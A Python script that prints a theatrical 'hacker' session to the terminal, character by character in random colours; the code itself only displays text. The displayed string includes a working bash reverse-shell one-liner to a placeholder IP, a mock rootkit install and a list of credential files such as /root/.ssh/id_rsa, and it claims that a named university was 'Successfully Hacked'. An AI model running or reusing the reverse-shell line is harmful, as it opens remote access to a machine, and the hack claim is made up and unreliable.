import time
import sys
import random


# defining variables
colors: dict = {
    "green": ["\033[32m", "\033[0m"],
    "blue": ["\033[33m", "\033[0m"],
    "red": ["\033[31m", "\033[0m"],
    "default": ["\033[0m", "\033[0m"]
}
color_changing_points = list(".:(){}[]#")
different_time_pause_values = [0.03, 0.01, 0.05, 0.08, 0.1]

text = """
[+] Initializing secure shell...
[+] Establishing encrypted tunnel: [AES-256 | SHA-512 handshake... completed]
[+] Injecting payload into target node 192.168.14.32...
[+] Payload execution: silent mode ENABLED.
[+] Elevating privileges: sudoers file modified.
[+] Root access granted. Extracting environment variables...
[+] Cloning encrypted repo: git@shadowrepo.darkweb:/vault/infiltrator.git
[+] Deploying autonomous script:

>>> import os, sys, subprocess
>>> def escalate():
>>>     subprocess.run(['sudo', 'apt-get', 'install', '--force-yes', 'rootkit'])
>>> escalate()

[+] Bypassing firewall: Injecting custom iptables rules.
[+] Mapping open ports: 22 (SSH), 443 (HTTPS), 3306 (MySQL)
[+] Uploading reverse shell:

bash -i >& /dev/tcp/198.51.100.23/9001 0>&1

[+] Implanting persistent backdoor.
[+] Scraping credentials from memory dump...
[+] Cracking hashed passwords using custom GPU-accelerated rainbow table.
[+] Success. Admin password cracked: *D34D_B33F_404*

[+] Creating virtual machine clone in hypervisor.
[+] Spoofing MAC address. Cloaking identity.
[+] Zero-day exploit deployed. Target compromised.
[+] Initiating silent data exfiltration:
    - /etc/passwd
    - /var/mail
    - /home/admin/Documents
    - /root/.ssh/id_rsa

[+] Encryption of extracted files: [PGP | AES]
[+] Upload complete to offshore secure server.
[+] Log files scrubbed. Audit trails sanitized.

[+] Disconnecting...
Session Terminated. No traces remain.

_ "Code is an extension of will. Silence is the true armor." _


[[[ IIMT .University . Successfully .Hacked!   ]]]]


            -----------
        ---             ---
    ---                     ---
  ---       ()    ()          ---
  ---                         ---
  ---           0             ---
    ---                     ---
      ---    [][[][][]     ---
      ---                  ---
      ---                  ---
      ------------------------   
    

\n"""




prev_color = colors["red"]
for char in text:
    if char in color_changing_points:
        color = colors.get(random.choice(list(colors.keys())))

        prev_color = color
    else:
        color = prev_color

    sys.stdout.write(f"{color[0]}{char}{color[1]}")

    sys.stdout.flush()
    time.sleep(random.choice(different_time_pause_values))
